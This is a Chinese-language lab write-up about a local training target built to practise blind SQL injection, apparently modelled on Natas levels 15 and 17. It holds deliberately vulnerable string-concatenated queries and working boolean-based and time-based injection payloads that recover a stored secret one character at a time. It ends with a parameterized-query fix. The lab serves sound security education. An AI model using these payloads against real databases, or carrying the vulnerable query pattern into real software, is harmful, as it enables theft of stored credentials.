# S2 補強：「無回饋」情境的資訊洩漏（盲注）

> 補強 Natas 續解中發現的兩個缺口：**SQL 布林盲注**（natas15）與 **time-based 盲注**（natas17）。
>
> 對應研究報告 **CH06 S1**，並延續 **S2d（Natas 14–19）** 的發現。

- 日期：2026-10-19
- 新增靶場：`blindlab/`
- **驗證結果：4/4 全部通過**
- **完整洩漏機密**：`FLAG{blind_sqli_leaked_secret_2026}`（兩種盲注各自獨立洩漏）

---

## 一、為什麼要補這個缺口

### 本專案原本的盲點

本專案已有 SQL 注入與命令注入靶場，但它們都是**「有回饋」**的：
- 錯誤訊息會顯示
- 資料會輸出

**但真實世界更常見的是「完全沒有回饋」**——這時攻擊者仍能靠盲注完整洩漏資料。

### Natas 的實證

| Natas | 情境 | 本專案原有 |
|---|---|---|
| natas15 | 只有 `exists` / `doesn't exist` | ❌ 無此類靶場 |
| natas17 | **回應完全相同**（連是非題都沒有） | ❌ 無此類靶場 |

---

## 二、靶場設計（blindlab/）

```
blindlab/
├── blindlab.py          # 靶場（4 個端點）
├── verify_blindlab.py   # 驗證（4/4）
└── blind.db             # SQLite 資料庫（自動建立）
```

### 四個端點

| 端點 | 特性 | 回饋程度 |
|---|---|---|
| `/b1` | 布林盲注 | 只有「存在/不存在」 |
| `/b2` | time-based 盲注 | **完全沒有文字差異** |
| `/b3` | 錯誤訊息洩漏 | 顯示 SQL 與錯誤 |
| `/safe` | 參數化查詢 | 完全無法注入 |

### 資料庫

```sql
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT);
INSERT INTO users VALUES (1, 'admin', 'FLAG{blind_sqli_leaked_secret_2026}');
INSERT INTO users VALUES (2, 'guest', 'guest-pass-not-secret');
```

---

## 三、B1 · SQL 布林盲注（4/4 之一）

### 漏洞實作

```python
query = "SELECT * FROM users WHERE username='%s'" % username   # ★ 字串拼接
```

回應只有兩種：
```
This user exists.       （True）
This user doesn't exist.（False）
```

### Oracle

```sql
username=admin' AND 1=1 --    → exists
username=admin' AND 1=2 --    → doesn't exist
```

### 破解：把是非題變成資料

```sql
username=admin' AND unicode(substr(password,N,1))>M --
```

用**二分搜尋 ASCII**，每個字元約 6 次請求。

**實測結果**：
```
★ 洩漏：FLAG{blind_sqli_leaked_secret_2026}
```

> **關鍵洞察**：伺服器**從來沒有輸出任何資料**，
> 但攻擊者靠「存在/不存在」的是非題，
> 仍然逐字元還原了完整的機密。

---

## 四、B2 · time-based 盲注（4/4 之二）

### 漏洞實作

```python
query = "SELECT * FROM users WHERE username='%s'" % username
# ★ 回應「完全一樣」（連 exists 都不顯示）
return "查詢已執行。"
```

### 唯一訊號：回應時間

SQLite 沒有內建 `sleep`，我在連線時註冊自訂函式：

```python
conn.create_function("sleep", 1, lambda x: time.sleep(float(x)) or 0)
```

**Oracle**：
```sql
username=admin' AND CASE WHEN (1=1) THEN sleep(1) ELSE 0 END --
```

**實測**：
```
正常條件: 0.00s | sleep 條件: 1.00s
```

### 破解

```sql
username=admin' AND CASE WHEN (unicode(substr(password,N,1))>M)
                         THEN sleep(1) ELSE 0 END --
```

**實測結果**（逐字元）：
```
pos 1 → 'F' (F)
pos 2 → 'L' (FL)
pos 3 → 'A' (FLA)
pos 4 → 'G' (FLAG)
...
★ 洩漏：FLAG{blind_sqli_leaked_secret_2026}
```

> **這是最難偵測的注入類型**：
> 沒有資料輸出、沒有錯誤訊息、回應內容完全相同——
> **WAF 和日誌幾乎看不出異常**，只有回應時間差。

---

## 五、B3 · 錯誤訊息洩漏（4/4 之三）

### 漏洞實作

```python
except Exception as e:
    return "資料庫錯誤：<pre>Query: %s\nError: %s</pre>" % (query, e)
```

### 實測洩漏

```
Query: SELECT * FROM users WHERE username='x''
Error: unrecognized token: "'x''"
```

**洩漏了**：
- 表名 `users`
- 欄位 `username`
- 確切的語法位置

> **這正是 natas15 中 `$query` 被 echo 出來的同類問題**。

---

## 六、B4 · 安全對照：參數化查詢（4/4 之四）

### 正確實作

```python
c.execute("SELECT * FROM users WHERE username=?", (username,))
```

### 實測

```
注入測試 1: /safe?username=admin' AND 1=1 --  → exists=False
注入測試 2: /safe?username=admin' AND 1=2 --  → exists=False
正常查詢  : /safe?username=admin             → exists=True
```

**兩個注入 payload 都完全無效**——因為整個字串被當成「使用者名稱」，
不會被解析為 SQL 語法。

> **教學意義**：同一支程式的邏輯，換成參數化查詢就完全無法注入。
> **這是最有效、最根本的 SQL 注入防護。**

---

## 七、四種回饋程度的完整對照

| 端點 | 攻擊者能看到的 | 攻擊手法 | 難度 |
|---|---|---|---|
| `/b3` | SQL 與錯誤訊息 | 直接讀 | ★ |
| `/b1` | 是非題（exists/not） | 二分搜尋 | ★★★ |
| `/b2` | **什麼都沒有**（只有時間） | time-based 二分 | ★★★★★ |
| `/safe` | — | **無法注入** | — |

> **這是一條完整的「資訊洩漏階梯」**：
> 從「直接讀」到「只能靠時間」，攻擊者的技巧需求逐步提高，
> 但**最終都能取得資料**。

---

## 八、與 Natas 的對應

| Natas | 手法 | 本專案靶場 | 狀態 |
|---|---|---|---|
| natas15 | `natas16" AND ASCII(SUBSTR(...))>M #` | **`blindlab` B1** | ✅ 補強完成 |
| natas17 | `IF(...,SLEEP(1),0)` | **`blindlab` B2** | ✅ 補強完成 |
| natas15 | 錯誤訊息被 echo | **`blindlab` B3** | ✅ 對應 |

**現在 Natas 中的每一個技巧，本專案都有對應的本機靶場。**

---

## 九、開發時的技術細節

### 坑 1：SQLite 沒有 `unicode('')=0`

原本用 `unicode(substr(password,pos,1))=0` 判斷字串結束，
但 SQLite 的 `unicode('')` 回傳 **NULL**，不是 0，導致不會終止。

**修正**：改用 `LENGTH(password)>=pos` 判斷。

（這與 Natas 實戰時踩的坑同類：**終止條件必須用可靠的方法**。）

### 坑 2：SQLite 沒有 `sleep`

**修正**：用 `conn.create_function("sleep", 1, ...)` 註冊自訂函式。

### 坑 3：B3 的錯誤訊息要顯示 SQL 才洩漏結構

初版只回傳 exception 字串（`unrecognized token`），不足以證明「洩漏表名」。
**修正**：同時顯示 `Query:` 與 `Error:`，才能看到 `users` 和 `username`。

---

## 十、檔案與複現

```
vuln-lab/blindlab/
├── blindlab.py            # 靶場（B1/B2/B3 + 安全對照）
├── verify_blindlab.py     # 驗證（4/4，自動化盲注破解）
└── blind.db               # SQLite（自動建立）
vuln-lab/findings/
└── blindlab_verification.txt
```

**複現**：
```powershell
python vuln-lab/blindlab/blindlab.py 8960
python vuln-lab/blindlab/verify_blindlab.py 8960
```

**手動練習**：
```
B1 布林盲注 : http://127.0.0.1:8960/b1?username=admin' AND 1=1 --
              http://127.0.0.1:8960/b1?username=admin' AND 1=2 --
B2 時間盲注 : http://127.0.0.1:8960/b2?username=admin' AND CASE WHEN (1=1) THEN sleep(1) ELSE 0 END --
B3 錯誤洩漏 : http://127.0.0.1:8960/b3?username=x'
B4 安全對照 : http://127.0.0.1:8960/safe?username=admin' AND 1=1 --
```

---

## 十一、結論

### 補強成果

| 缺口 | 靶場 | 驗證 |
|---|---|---|
| **SQL 布林盲注** | `blindlab` B1 | ✅ |
| **time-based 盲注** | `blindlab` B2 | ✅ |

### 三個核心學習

1. **沒有回饋 ≠ 沒有漏洞**
   伺服器什麼都不輸出，攻擊者仍能逐字元還原資料。

2. **時間也是一種輸出**
   time-based 盲注把「時間」當成 boolean oracle，
   是最難被 WAF/日誌偵測的注入類型。

3. **參數化查詢是根本解**
   不是「過濾特殊字元」，而是「讓資料永遠是資料」——
   `/safe` 端點證明：換一個實作方式，四種攻擊全部失效。

### 本專案現在的完整度

```
靶場：18 個（新增 blindlab）
驗證型態：20 種（新增「盲注」）
報告：28 份
```

---

*本文件為教育用途的實作記錄。使用本機 SQLite，資料為模擬；
所有測試 100% 在本機自建靶場完成。*
